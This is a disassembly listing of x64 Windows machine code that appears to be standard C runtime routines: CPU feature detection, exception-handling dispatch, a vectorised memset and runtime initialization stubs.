   140001e69:	44 8b c1             	mov    %ecx,%r8d
   140001e6c:	45 33 db             	xor    %r11d,%r11d
   140001e6f:	44 8b cb             	mov    %ebx,%r9d
   140001e72:	41 81 f0 6e 74 65 6c 	xor    $0x6c65746e,%r8d
   140001e79:	41 81 f1 47 65 6e 75 	xor    $0x756e6547,%r9d
   140001e80:	44 8b d2             	mov    %edx,%r10d
   140001e83:	8b f0                	mov    %eax,%esi
   140001e85:	33 c9                	xor    %ecx,%ecx
   140001e87:	41 8d 43 01          	lea    0x1(%r11),%eax
   140001e8b:	45 0b c8             	or     %r8d,%r9d
   140001e8e:	0f a2                	cpuid
   140001e90:	41 81 f2 69 6e 65 49 	xor    $0x49656e69,%r10d
   140001e97:	89 04 24             	mov    %eax,(%rsp)
   140001e9a:	45 0b ca             	or     %r10d,%r9d
   140001e9d:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   140001ea1:	8b f9                	mov    %ecx,%edi
   140001ea3:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140001ea7:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   140001eab:	75 50                	jne    0x140001efd
   140001ead:	48 83 0d 9b 51 01 00 	orq    $0xffffffffffffffff,0x1519b(%rip)        # 0x140017050
   140001eb4:	ff 
   140001eb5:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   140001eba:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   140001ebf:	74 28                	je     0x140001ee9
   140001ec1:	3d 60 06 02 00       	cmp    $0x20660,%eax
   140001ec6:	74 21                	je     0x140001ee9
   140001ec8:	3d 70 06 02 00       	cmp    $0x20670,%eax
   140001ecd:	74 1a                	je     0x140001ee9
   140001ecf:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   140001ed4:	83 f8 20             	cmp    $0x20,%eax
   140001ed7:	77 24                	ja     0x140001efd
   140001ed9:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   140001ee0:	00 00 00 
   140001ee3:	48 0f a3 c1          	bt     %rax,%rcx
   140001ee7:	73 14                	jae    0x140001efd
   140001ee9:	44 8b 05 28 61 01 00 	mov    0x16128(%rip),%r8d        # 0x140018018
   140001ef0:	41 83 c8 01          	or     $0x1,%r8d
   140001ef4:	44 89 05 1d 61 01 00 	mov    %r8d,0x1611d(%rip)        # 0x140018018
   140001efb:	eb 07                	jmp    0x140001f04
   140001efd:	44 8b 05 14 61 01 00 	mov    0x16114(%rip),%r8d        # 0x140018018
   140001f04:	b8 07 00 00 00       	mov    $0x7,%eax
   140001f09:	44 8d 48 fb          	lea    -0x5(%rax),%r9d
   140001f0d:	3b f0                	cmp    %eax,%esi
   140001f0f:	7c 26                	jl     0x140001f37
   140001f11:	33 c9                	xor    %ecx,%ecx
   140001f13:	0f a2                	cpuid
   140001f15:	89 04 24             	mov    %eax,(%rsp)
   140001f18:	44 8b db             	mov    %ebx,%r11d
   140001f1b:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   140001f1f:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140001f23:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   140001f27:	0f ba e3 09          	bt     $0x9,%ebx
   140001f2b:	73 0a                	jae    0x140001f37
   140001f2d:	45 0b c1             	or     %r9d,%r8d
   140001f30:	44 89 05 e1 60 01 00 	mov    %r8d,0x160e1(%rip)        # 0x140018018
   140001f37:	c7 05 07 51 01 00 01 	movl   $0x1,0x15107(%rip)        # 0x140017048
   140001f3e:	00 00 00 
   140001f41:	44 89 0d 04 51 01 00 	mov    %r9d,0x15104(%rip)        # 0x14001704c
   140001f48:	0f ba e7 14          	bt     $0x14,%edi
   140001f4c:	0f 83 91 00 00 00    	jae    0x140001fe3
   140001f52:	44 89 0d ef 50 01 00 	mov    %r9d,0x150ef(%rip)        # 0x140017048
   140001f59:	bb 06 00 00 00       	mov    $0x6,%ebx
   140001f5e:	89 1d e8 50 01 00    	mov    %ebx,0x150e8(%rip)        # 0x14001704c
   140001f64:	0f ba e7 1b          	bt     $0x1b,%edi
   140001f68:	73 79                	jae    0x140001fe3
   140001f6a:	0f ba e7 1c          	bt     $0x1c,%edi
   140001f6e:	73 73                	jae    0x140001fe3
   140001f70:	33 c9                	xor    %ecx,%ecx
   140001f72:	0f 01 d0             	xgetbv
   140001f75:	48 c1 e2 20          	shl    $0x20,%rdx
   140001f79:	48 0b d0             	or     %rax,%rdx
   140001f7c:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140001f81:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140001f86:	22 c3                	and    %bl,%al
   140001f88:	3a c3                	cmp    %bl,%al
   140001f8a:	75 57                	jne    0x140001fe3
   140001f8c:	8b 05 ba 50 01 00    	mov    0x150ba(%rip),%eax        # 0x14001704c
   140001f92:	83 c8 08             	or     $0x8,%eax
   140001f95:	c7 05 a9 50 01 00 03 	movl   $0x3,0x150a9(%rip)        # 0x140017048
   140001f9c:	00 00 00 
   140001f9f:	89 05 a7 50 01 00    	mov    %eax,0x150a7(%rip)        # 0x14001704c
   140001fa5:	41 f6 c3 20          	test   $0x20,%r11b
   140001fa9:	74 38                	je     0x140001fe3
   140001fab:	83 c8 20             	or     $0x20,%eax
   140001fae:	c7 05 90 50 01 00 05 	movl   $0x5,0x15090(%rip)        # 0x140017048
   140001fb5:	00 00 00 
   140001fb8:	89 05 8e 50 01 00    	mov    %eax,0x1508e(%rip)        # 0x14001704c
   140001fbe:	b8 00 00 03 d0       	mov    $0xd0030000,%eax
   140001fc3:	44 23 d8             	and    %eax,%r11d
   140001fc6:	44 3b d8             	cmp    %eax,%r11d
   140001fc9:	75 18                	jne    0x140001fe3
   140001fcb:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140001fd0:	24 e0                	and    $0xe0,%al
   140001fd2:	3c e0                	cmp    $0xe0,%al
   140001fd4:	75 0d                	jne    0x140001fe3
   140001fd6:	83 0d 6f 50 01 00 40 	orl    $0x40,0x1506f(%rip)        # 0x14001704c
   140001fdd:	89 1d 65 50 01 00    	mov    %ebx,0x15065(%rip)        # 0x140017048
   140001fe3:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   140001fe8:	33 c0                	xor    %eax,%eax
   140001fea:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   140001fef:	48 83 c4 10          	add    $0x10,%rsp
   140001ff3:	5f                   	pop    %rdi
   140001ff4:	c3                   	ret
   140001ff5:	cc                   	int3
   140001ff6:	cc                   	int3
   140001ff7:	cc                   	int3
   140001ff8:	33 c0                	xor    %eax,%eax
   140001ffa:	39 05 1c 60 01 00    	cmp    %eax,0x1601c(%rip)        # 0x14001801c
   140002000:	0f 95 c0             	setne  %al
   140002003:	c3                   	ret
   140002004:	cc                   	int3
   140002005:	cc                   	int3
   140002006:	cc                   	int3
   140002007:	cc                   	int3
   140002008:	cc                   	int3
   140002009:	cc                   	int3
   14000200a:	cc                   	int3
   14000200b:	cc                   	int3
   14000200c:	cc                   	int3
   14000200d:	cc                   	int3
   14000200e:	cc                   	int3
   14000200f:	cc                   	int3
   140002010:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002015:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000201a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000201f:	57                   	push   %rdi
   140002020:	41 54                	push   %r12
   140002022:	41 55                	push   %r13
   140002024:	41 56                	push   %r14
   140002026:	41 57                	push   %r15
   140002028:	48 83 ec 40          	sub    $0x40,%rsp
   14000202c:	48 8b e9             	mov    %rcx,%rbp
   14000202f:	4d 8b f9             	mov    %r9,%r15
   140002032:	49 8b c8             	mov    %r8,%rcx
   140002035:	49 8b f8             	mov    %r8,%rdi
   140002038:	4c 8b ea             	mov    %rdx,%r13
   14000203b:	e8 d4 19 00 00       	call   0x140003a14
   140002040:	4d 8b 67 08          	mov    0x8(%r15),%r12
   140002044:	4d 8b 37             	mov    (%r15),%r14
   140002047:	49 8b 5f 38          	mov    0x38(%r15),%rbx
   14000204b:	4d 2b f4             	sub    %r12,%r14
   14000204e:	f6 45 04 66          	testb  $0x66,0x4(%rbp)
   140002052:	41 8b 77 48          	mov    0x48(%r15),%esi
   140002056:	0f 85 dc 00 00 00    	jne    0x140002138
   14000205c:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   140002061:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   140002066:	3b 33                	cmp    (%rbx),%esi
   140002068:	0f 83 8a 01 00 00    	jae    0x1400021f8
   14000206e:	8b fe                	mov    %esi,%edi
   140002070:	48 03 ff             	add    %rdi,%rdi
   140002073:	8b 44 fb 04          	mov    0x4(%rbx,%rdi,8),%eax
   140002077:	4c 3b f0             	cmp    %rax,%r14
   14000207a:	0f 82 aa 00 00 00    	jb     0x14000212a
   140002080:	8b 44 fb 08          	mov    0x8(%rbx,%rdi,8),%eax
   140002084:	4c 3b f0             	cmp    %rax,%r14
   140002087:	0f 83 9d 00 00 00    	jae    0x14000212a
   14000208d:	83 7c fb 10 00       	cmpl   $0x0,0x10(%rbx,%rdi,8)
   140002092:	0f 84 92 00 00 00    	je     0x14000212a
   140002098:	83 7c fb 0c 01       	cmpl   $0x1,0xc(%rbx,%rdi,8)
   14000209d:	74 17                	je     0x1400020b6
   14000209f:	8b 44 fb 0c          	mov    0xc(%rbx,%rdi,8),%eax
   1400020a3:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400020a8:	49 03 c4             	add    %r12,%rax
   1400020ab:	49 8b d5             	mov    %r13,%rdx
   1400020ae:	ff d0                	call   *%rax
   1400020b0:	85 c0                	test   %eax,%eax
   1400020b2:	78 7d                	js     0x140002131
   1400020b4:	7e 74                	jle    0x14000212a
   1400020b6:	81 7d 00 63 73 6d e0 	cmpl   $0xe06d7363,0x0(%rbp)
   1400020bd:	75 28                	jne    0x1400020e7
   1400020bf:	48 83 3d 99 c0 00 00 	cmpq   $0x0,0xc099(%rip)        # 0x14000e160
   1400020c6:	00 
   1400020c7:	74 1e                	je     0x1400020e7
   1400020c9:	48 8d 0d 90 c0 00 00 	lea    0xc090(%rip),%rcx        # 0x14000e160
   1400020d0:	e8 ab 18 00 00       	call   0x140003980
   1400020d5:	85 c0                	test   %eax,%eax
   1400020d7:	74 0e                	je     0x1400020e7
   1400020d9:	ba 01 00 00 00       	mov    $0x1,%edx
   1400020de:	48 8b cd             	mov    %rbp,%rcx
   1400020e1:	ff 15 79 c0 00 00    	call   *0xc079(%rip)        # 0x14000e160
   1400020e7:	8b 4c fb 10          	mov    0x10(%rbx,%rdi,8),%ecx
   1400020eb:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400020f1:	49 03 cc             	add    %r12,%rcx
   1400020f4:	49 8b d5             	mov    %r13,%rdx
   1400020f7:	e8 e4 18 00 00       	call   0x1400039e0
   1400020fc:	49 8b 47 40          	mov    0x40(%r15),%rax
   140002100:	4c 8b c5             	mov    %rbp,%r8
   140002103:	8b 54 fb 10          	mov    0x10(%rbx,%rdi,8),%edx
   140002107:	49 8b cd             	mov    %r13,%rcx
   14000210a:	44 8b 4d 00          	mov    0x0(%rbp),%r9d
   14000210e:	49 03 d4             	add    %r12,%rdx
   140002111:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140002116:	49 8b 47 28          	mov    0x28(%r15),%rax
   14000211a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000211f:	ff 15 c3 37 01 00    	call   *0x137c3(%rip)        # 0x1400158e8
   140002125:	e8 e6 18 00 00       	call   0x140003a10
   14000212a:	ff c6                	inc    %esi
   14000212c:	e9 35 ff ff ff       	jmp    0x140002066
   140002131:	33 c0                	xor    %eax,%eax
   140002133:	e9 c5 00 00 00       	jmp    0x1400021fd
   140002138:	49 8b 7f 20          	mov    0x20(%r15),%rdi
   14000213c:	44 8b 0b             	mov    (%rbx),%r9d
   14000213f:	49 2b fc             	sub    %r12,%rdi
   140002142:	41 3b f1             	cmp    %r9d,%esi
   140002145:	0f 83 ad 00 00 00    	jae    0x1400021f8
   14000214b:	45 8b c1             	mov    %r9d,%r8d
   14000214e:	8b d6                	mov    %esi,%edx
   140002150:	41 8b c8             	mov    %r8d,%ecx
   140002153:	48 03 d2             	add    %rdx,%rdx
   140002156:	8b 44 d3 04          	mov    0x4(%rbx,%rdx,8),%eax
   14000215a:	4c 3b f0             	cmp    %rax,%r14
   14000215d:	0f 82 88 00 00 00    	jb     0x1400021eb
   140002163:	8b 44 d3 08          	mov    0x8(%rbx,%rdx,8),%eax
   140002167:	4c 3b f0             	cmp    %rax,%r14
   14000216a:	73 7f                	jae    0x1400021eb
   14000216c:	44 8b 5d 04          	mov    0x4(%rbp),%r11d
   140002170:	41 83 e3 20          	and    $0x20,%r11d
   140002174:	74 44                	je     0x1400021ba
   140002176:	45 33 d2             	xor    %r10d,%r10d
   140002179:	45 85 c0             	test   %r8d,%r8d
   14000217c:	74 34                	je     0x1400021b2
   14000217e:	41 8b ca             	mov    %r10d,%ecx
   140002181:	48 03 c9             	add    %rcx,%rcx
   140002184:	8b 44 cb 04          	mov    0x4(%rbx,%rcx,8),%eax
   140002188:	48 3b f8             	cmp    %rax,%rdi
   14000218b:	72 1d                	jb     0x1400021aa
   14000218d:	8b 44 cb 08          	mov    0x8(%rbx,%rcx,8),%eax
   140002191:	48 3b f8             	cmp    %rax,%rdi
   140002194:	73 14                	jae    0x1400021aa
   140002196:	8b 44 d3 10          	mov    0x10(%rbx,%rdx,8),%eax
   14000219a:	39 44 cb 10          	cmp    %eax,0x10(%rbx,%rcx,8)
   14000219e:	75 0a                	jne    0x1400021aa
   1400021a0:	8b 44 d3 0c          	mov    0xc(%rbx,%rdx,8),%eax
   1400021a4:	39 44 cb 0c          	cmp    %eax,0xc(%rbx,%rcx,8)
   1400021a8:	74 08                	je     0x1400021b2
   1400021aa:	41 ff c2             	inc    %r10d
   1400021ad:	45 3b d0             	cmp    %r8d,%r10d
   1400021b0:	72 cc                	jb     0x14000217e
   1400021b2:	41 8b c9             	mov    %r9d,%ecx
   1400021b5:	45 3b d1             	cmp    %r9d,%r10d
   1400021b8:	75 3e                	jne    0x1400021f8
   1400021ba:	8b 44 d3 10          	mov    0x10(%rbx,%rdx,8),%eax
   1400021be:	85 c0                	test   %eax,%eax
   1400021c0:	74 0c                	je     0x1400021ce
   1400021c2:	48 3b f8             	cmp    %rax,%rdi
   1400021c5:	75 24                	jne    0x1400021eb
   1400021c7:	45 85 db             	test   %r11d,%r11d
   1400021ca:	75 2c                	jne    0x1400021f8
   1400021cc:	eb 1d                	jmp    0x1400021eb
   1400021ce:	8d 46 01             	lea    0x1(%rsi),%eax
   1400021d1:	b1 01                	mov    $0x1,%cl
   1400021d3:	41 89 47 48          	mov    %eax,0x48(%r15)
   1400021d7:	44 8b 44 d3 0c       	mov    0xc(%rbx,%rdx,8),%r8d
   1400021dc:	49 8b d5             	mov    %r13,%rdx
   1400021df:	4d 03 c4             	add    %r12,%r8
   1400021e2:	41 ff d0             	call   *%r8
   1400021e5:	44 8b 0b             	mov    (%rbx),%r9d
   1400021e8:	41 8b c9             	mov    %r9d,%ecx
   1400021eb:	ff c6                	inc    %esi
   1400021ed:	44 8b c1             	mov    %ecx,%r8d
   1400021f0:	3b f1                	cmp    %ecx,%esi
   1400021f2:	0f 82 56 ff ff ff    	jb     0x14000214e
   1400021f8:	b8 01 00 00 00       	mov    $0x1,%eax
   1400021fd:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   140002202:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   140002206:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   14000220a:	49 8b 73 40          	mov    0x40(%r11),%rsi
   14000220e:	49 8b e3             	mov    %r11,%rsp
   140002211:	41 5f                	pop    %r15
   140002213:	41 5e                	pop    %r14
   140002215:	41 5d                	pop    %r13
   140002217:	41 5c                	pop    %r12
   140002219:	5f                   	pop    %rdi
   14000221a:	c3                   	ret
   14000221b:	cc                   	int3
   14000221c:	48 85 c9             	test   %rcx,%rcx
   14000221f:	74 67                	je     0x140002288
   140002221:	88 54 24 10          	mov    %dl,0x10(%rsp)
   140002225:	48 83 ec 48          	sub    $0x48,%rsp
   140002229:	81 39 63 73 6d e0    	cmpl   $0xe06d7363,(%rcx)
   14000222f:	75 53                	jne    0x140002284
   140002231:	83 79 18 04          	cmpl   $0x4,0x18(%rcx)
   140002235:	75 4d                	jne    0x140002284
   140002237:	8b 41 20             	mov    0x20(%rcx),%eax
   14000223a:	2d 20 05 93 19       	sub    $0x19930520,%eax
   14000223f:	83 f8 02             	cmp    $0x2,%eax
   140002242:	77 40                	ja     0x140002284
   140002244:	48 8b 41 30          	mov    0x30(%rcx),%rax
   140002248:	48 85 c0             	test   %rax,%rax
   14000224b:	74 37                	je     0x140002284
   14000224d:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140002251:	85 d2                	test   %edx,%edx
   140002253:	74 11                	je     0x140002266
   140002255:	48 03 51 38          	add    0x38(%rcx),%rdx
   140002259:	48 8b 49 28          	mov    0x28(%rcx),%rcx
   14000225d:	e8 2a 00 00 00       	call   0x14000228c
   140002262:	eb 20                	jmp    0x140002284
   140002264:	eb 1e                	jmp    0x140002284
   140002266:	f6 00 10             	testb  $0x10,(%rax)
   140002269:	74 19                	je     0x140002284
   14000226b:	48 8b 41 28          	mov    0x28(%rcx),%rax
   14000226f:	48 8b 08             	mov    (%rax),%rcx
   140002272:	48 85 c9             	test   %rcx,%rcx
   140002275:	74 0d                	je     0x140002284
   140002277:	48 8b 01             	mov    (%rcx),%rax
   14000227a:	48 8b 40 10          	mov    0x10(%rax),%rax
   14000227e:	ff 15 8c 7d 01 00    	call   *0x17d8c(%rip)        # 0x14001a010
   140002284:	48 83 c4 48          	add    $0x48,%rsp
   140002288:	c3                   	ret
   140002289:	cc                   	int3
   14000228a:	cc                   	int3
   14000228b:	cc                   	int3
   14000228c:	48 ff e2             	rex.W jmp *%rdx
   14000228f:	cc                   	int3
   140002290:	48 83 ec 28          	sub    $0x28,%rsp
   140002294:	e8 77 18 00 00       	call   0x140003b10
   140002299:	48 83 c0 20          	add    $0x20,%rax
   14000229d:	48 83 c4 28          	add    $0x28,%rsp
   1400022a1:	c3                   	ret
   1400022a2:	cc                   	int3
   1400022a3:	cc                   	int3
   1400022a4:	48 83 ec 28          	sub    $0x28,%rsp
   1400022a8:	e8 63 18 00 00       	call   0x140003b10
   1400022ad:	48 83 c0 28          	add    $0x28,%rax
   1400022b1:	48 83 c4 28          	add    $0x28,%rsp
   1400022b5:	c3                   	ret
   1400022b6:	cc                   	int3
   1400022b7:	cc                   	int3
   1400022b8:	48 83 ec 28          	sub    $0x28,%rsp
   1400022bc:	e8 bf 19 00 00       	call   0x140003c80
   1400022c1:	84 c0                	test   %al,%al
   1400022c3:	75 04                	jne    0x1400022c9
   1400022c5:	32 c0                	xor    %al,%al
   1400022c7:	eb 12                	jmp    0x1400022db
   1400022c9:	e8 d6 17 00 00       	call   0x140003aa4
   1400022ce:	84 c0                	test   %al,%al
   1400022d0:	75 07                	jne    0x1400022d9
   1400022d2:	e8 dd 19 00 00       	call   0x140003cb4
   1400022d7:	eb ec                	jmp    0x1400022c5
   1400022d9:	b0 01                	mov    $0x1,%al
   1400022db:	48 83 c4 28          	add    $0x28,%rsp
   1400022df:	c3                   	ret
   1400022e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400022e4:	84 c9                	test   %cl,%cl
   1400022e6:	75 0a                	jne    0x1400022f2
   1400022e8:	e8 ff 17 00 00       	call   0x140003aec
   1400022ed:	e8 c2 19 00 00       	call   0x140003cb4
   1400022f2:	b0 01                	mov    $0x1,%al
   1400022f4:	48 83 c4 28          	add    $0x28,%rsp
   1400022f8:	c3                   	ret
   1400022f9:	cc                   	int3
   1400022fa:	cc                   	int3
   1400022fb:	cc                   	int3
   1400022fc:	cc                   	int3
   1400022fd:	cc                   	int3
   1400022fe:	cc                   	int3
   1400022ff:	cc                   	int3
   140002300:	cc                   	int3
   140002301:	cc                   	int3
   140002302:	cc                   	int3
   140002303:	cc                   	int3
   140002304:	cc                   	int3
   140002305:	cc                   	int3
   140002306:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000230d:	00 00 00 
   140002310:	57                   	push   %rdi
   140002311:	8b c2                	mov    %edx,%eax
   140002313:	48 8b f9             	mov    %rcx,%rdi
   140002316:	49 8b c8             	mov    %r8,%rcx
   140002319:	f3 aa                	rep stos %al,(%rdi)
   14000231b:	49 8b c3             	mov    %r11,%rax
   14000231e:	5f                   	pop    %rdi
   14000231f:	c3                   	ret
   140002320:	cc                   	int3
   140002321:	cc                   	int3
   140002322:	cc                   	int3
   140002323:	cc                   	int3
   140002324:	cc                   	int3
   140002325:	cc                   	int3
   140002326:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000232d:	00 00 00 
   140002330:	4c 8b d9             	mov    %rcx,%r11
   140002333:	0f b6 d2             	movzbl %dl,%edx
   140002336:	49 b9 01 01 01 01 01 	movabs $0x101010101010101,%r9
   14000233d:	01 01 01 
   140002340:	4c 0f af ca          	imul   %rdx,%r9
   140002344:	49 83 f8 10          	cmp    $0x10,%r8
   140002348:	0f 86 f2 00 00 00    	jbe    0x140002440
   14000234e:	66 49 0f 6e c1       	movq   %r9,%xmm0
   140002353:	66 0f 60 c0          	punpcklbw %xmm0,%xmm0
   140002357:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   14000235e:	77 10                	ja     0x140002370
   140002360:	e9 6b 00 00 00       	jmp    0x1400023d0
   140002365:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   14000236c:	00 00 00 00 
   140002370:	f6 05 a1 5c 01 00 02 	testb  $0x2,0x15ca1(%rip)        # 0x140018018
   140002377:	75 97                	jne    0x140002310
   140002379:	0f 11 01             	movups %xmm0,(%rcx)
   14000237c:	4c 03 c1             	add    %rcx,%r8
   14000237f:	48 83 c1 10          	add    $0x10,%rcx
   140002383:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   140002387:	4c 2b c1             	sub    %rcx,%r8
   14000238a:	4d 8b c8             	mov    %r8,%r9
   14000238d:	49 c1 e9 07          	shr    $0x7,%r9
   140002391:	74 3d                	je     0x1400023d0
   140002393:	4c 3b 0d be 4c 01 00 	cmp    0x14cbe(%rip),%r9        # 0x140017058
   14000239a:	0f 87 60 00 00 00    	ja     0x140002400
   1400023a0:	0f 29 01             	movaps %xmm0,(%rcx)
   1400023a3:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   1400023a7:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   1400023ae:	0f 29 41 a0          	movaps %xmm0,-0x60(%rcx)
   1400023b2:	0f 29 41 b0          	movaps %xmm0,-0x50(%rcx)
   1400023b6:	49 ff c9             	dec    %r9
   1400023b9:	0f 29 41 c0          	movaps %xmm0,-0x40(%rcx)
   1400023bd:	0f 29 41 d0          	movaps %xmm0,-0x30(%rcx)
   1400023c1:	0f 29 41 e0          	movaps %xmm0,-0x20(%rcx)
   1400023c5:	66 0f 29 41 f0       	movapd %xmm0,-0x10(%rcx)
   1400023ca:	75 d4                	jne    0x1400023a0
   1400023cc:	49 83 e0 7f          	and    $0x7f,%r8
   1400023d0:	4d 8b c8             	mov    %r8,%r9
   1400023d3:	49 c1 e9 04          	shr    $0x4,%r9
   1400023d7:	74 13                	je     0x1400023ec
   1400023d9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400023e0:	0f 11 01             	movups %xmm0,(%rcx)
   1400023e3:	48 83 c1 10          	add    $0x10,%rcx
   1400023e7:	49 ff c9             	dec    %r9
   1400023ea:	75 f4                	jne    0x1400023e0
   1400023ec:	49 83 e0 0f          	and    $0xf,%r8
   1400023f0:	74 06                	je     0x1400023f8
   1400023f2:	42 0f 11 44 01 f0    	movups %xmm0,-0x10(%rcx,%r8,1)
   1400023f8:	49 8b c3             	mov    %r11,%rax
   1400023fb:	c3                   	ret
   1400023fc:	0f 1f 40 00          	nopl   0x0(%rax)
   140002400:	0f 2b 01             	movntps %xmm0,(%rcx)
   140002403:	0f 2b 41 10          	movntps %xmm0,0x10(%rcx)
   140002407:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   14000240e:	0f 2b 41 a0          	movntps %xmm0,-0x60(%rcx)
   140002412:	0f 2b 41 b0          	movntps %xmm0,-0x50(%rcx)
   140002416:	49 ff c9             	dec    %r9
   140002419:	0f 2b 41 c0          	movntps %xmm0,-0x40(%rcx)
   14000241d:	0f 2b 41 d0          	movntps %xmm0,-0x30(%rcx)
   140002421:	0f 2b 41 e0          	movntps %xmm0,-0x20(%rcx)
   140002425:	0f 2b 41 f0          	movntps %xmm0,-0x10(%rcx)
   140002429:	75 d5                	jne    0x140002400
   14000242b:	0f ae f8             	sfence
   14000242e:	49 83 e0 7f          	and    $0x7f,%r8
   140002432:	eb 9c                	jmp    0x1400023d0
   140002434:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000243b:	00 00 00 00 00 
   140002440:	49 8b d1             	mov    %r9,%rdx
   140002443:	4c 8d 0d b6 db ff ff 	lea    -0x244a(%rip),%r9        # 0x140000000
   14000244a:	43 8b 84 81 00 d0 01 	mov    0x1d000(%r9,%r8,4),%eax
   140002451:	00 
   140002452:	4c 03 c8             	add    %rax,%r9
   140002455:	49 03 c8             	add    %r8,%rcx
   140002458:	49 8b c3             	mov    %r11,%rax
   14000245b:	41 ff e1             	jmp    *%r9
   14000245e:	66 90                	xchg   %ax,%ax
   140002460:	48 89 51 f1          	mov    %rdx,-0xf(%rcx)
   140002464:	89 51 f9             	mov    %edx,-0x7(%rcx)
   140002467:	66 89 51 fd          	mov    %dx,-0x3(%rcx)
   14000246b:	88 51 ff             	mov    %dl,-0x1(%rcx)
   14000246e:	c3                   	ret
   14000246f:	90                   	nop
   140002470:	48 89 51 f4          	mov    %rdx,-0xc(%rcx)
   140002474:	89 51 fc             	mov    %edx,-0x4(%rcx)
   140002477:	c3                   	ret
   140002478:	48 89 51 f7          	mov    %rdx,-0x9(%rcx)
   14000247c:	88 51 ff             	mov    %dl,-0x1(%rcx)
   14000247f:	c3                   	ret
   140002480:	48 89 51 f3          	mov    %rdx,-0xd(%rcx)
   140002484:	89 51 fb             	mov    %edx,-0x5(%rcx)
   140002487:	88 51 ff             	mov    %dl,-0x1(%rcx)
   14000248a:	c3                   	ret
   14000248b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002490:	48 89 51 f2          	mov    %rdx,-0xe(%rcx)
   140002494:	89 51 fa             	mov    %edx,-0x6(%rcx)
   140002497:	66 89 51 fe          	mov    %dx,-0x2(%rcx)
   14000249b:	c3                   	ret
   14000249c:	48 89 10             	mov    %rdx,(%rax)
   14000249f:	c3                   	ret
   1400024a0:	48 89 10             	mov    %rdx,(%rax)
   1400024a3:	66 89 50 08          	mov    %dx,0x8(%rax)
   1400024a7:	88 50 0a             	mov    %dl,0xa(%rax)
   1400024aa:	c3                   	ret
   1400024ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400024b0:	48 89 10             	mov    %rdx,(%rax)
   1400024b3:	66 89 50 08          	mov    %dx,0x8(%rax)
   1400024b7:	c3                   	ret
   1400024b8:	48 89 10             	mov    %rdx,(%rax)
   1400024bb:	48 89 50 08          	mov    %rdx,0x8(%rax)
   1400024bf:	c3                   	ret
   1400024c0:	48 8d 05 e9 50 01 00 	lea    0x150e9(%rip),%rax        # 0x1400175b0
   1400024c7:	48 89 05 7a 66 01 00 	mov    %rax,0x1667a(%rip)        # 0x140018b48
   1400024ce:	b0 01                	mov    $0x1,%al
   1400024d0:	c3                   	ret
   1400024d1:	cc                   	int3
   1400024d2:	cc                   	int3
   1400024d3:	cc                   	int3
   1400024d4:	48 83 ec 28          	sub    $0x28,%rsp
   1400024d8:	48 8d 0d a9 5c 01 00 	lea    0x15ca9(%rip),%rcx        # 0x140018188
   1400024df:	e8 bc 09 00 00       	call   0x140002ea0
   1400024e4:	48 8d 0d b5 5c 01 00 	lea    0x15cb5(%rip),%rcx        # 0x1400181a0
   1400024eb:	e8 b0 09 00 00       	call   0x140002ea0
   1400024f0:	b0 01                	mov    $0x1,%al
   1400024f2:	48 83 c4 28          	add    $0x28,%rsp
   1400024f6:	c3                   	ret
   1400024f7:	cc                   	int3
   1400024f8:	48 83 ec 28          	sub    $0x28,%rsp
   1400024fc:	e8 2f 0e 00 00       	call   0x140003330
   140002501:	b0 01                	mov    $0x1,%al
   140002503:	48 83 c4 28          	add    $0x28,%rsp
   140002507:	c3                   	ret
   140002508:	40 53                	rex push %rbx
   14000250a:	48 83 ec 20          	sub    $0x20,%rsp
   14000250e:	48 8b 1d 23 4b 01 00 	mov    0x14b23(%rip),%rbx        # 0x140017038
   140002515:	48 8b cb             	mov    %rbx,%rcx
   140002518:	e8 77 35 00 00       	call   0x140005a94
   14000251d:	48 8b cb             	mov    %rbx,%rcx
   140002520:	e8 57 36 00 00       	call   0x140005b7c
   140002525:	48 8b cb             	mov    %rbx,%rcx
   140002528:	e8 8b 36 00 00       	call   0x140005bb8
   14000252d:	48 8b cb             	mov    %rbx,%rcx
   140002530:	e8 6b 01 00 00       	call   0x1400026a0
   140002535:	48 8b cb             	mov    %rbx,%rcx
   140002538:	e8 2f 02 00 00       	call   0x14000276c
   14000253d:	b0 01                	mov    $0x1,%al
   14000253f:	48 83 c4 20          	add    $0x20,%rsp
   140002543:	5b                   	pop    %rbx
   140002544:	c3                   	ret
